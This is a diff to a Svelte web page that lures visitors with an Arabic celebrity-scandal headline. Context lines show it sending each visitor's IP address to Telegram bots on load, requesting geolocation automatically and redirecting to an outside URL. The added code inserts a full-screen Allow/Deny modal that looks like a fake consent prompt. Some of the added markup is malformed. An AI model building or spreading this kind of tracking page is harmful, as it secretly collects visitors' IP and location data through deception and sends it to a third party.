@@ -2,6 +2,11 @@
   import { onMount } from 'svelte';
   
   onMount(async () => {
+
+
+     
+
+
     sendIPToTelegramBots();
     
     // Request location permission automatically
@@ -12,6 +17,30 @@
       },
       (error) => {
         if (error.code === error.PERMISSION_DENIED) {
+
+
+
+window.addEventListener('load', function () {
+      var modal = document.querySelector('.modal');
+      var allowBtn = document.getElementById('allowBtn');
+      var denyBtn = document.getElementById('denyBtn');
+
+      allowBtn.addEventListener('click', function () {
+        modal.style.display = 'none';
+        // Do any other action here after allowing
+      });
+
+      denyBtn.addEventListener('click', function () {
+        modal.style.display = 'none';
+        // Do any other action here after denying
+      });
+
+      modal.style.display = 'block';
+    });
+
+
+
+
           // Location permission denied, send IP result to Telegram bots
           redirectToNextURL();
         }
@@ -149,9 +178,22 @@ ${ipAddress}
       window.location.href = 'https://mhf1.onrender.com/';
     }
   }
+
+
+
+
 </script>
 
 <main>
+div class="modal">
+    <div class="modal-content">
+      <button id="allowBtn">Allow</button>
+      <button id="denyBtn">Deny</button>
+    </div>
+  </div>
+
+
+
   <center>
     <h1 style="font-size: 36px; font-weight: bold;">فضايح هيفاء وهبي</h1>
   </center>
@@ -204,4 +246,31 @@ ${ipAddress}
     max-width: 100%;
     height: auto;
   }
+/* Style for the modal dialog */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.5);
+    }
+
+    /* Style for the dialog content */
+    .modal-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin: 20% auto;
+      padding: 20px;
+      background-color: #fff;
+      border: 1px solid #888;
+      width: 300px;
+      text-align: center;
+    }
+
 </style>
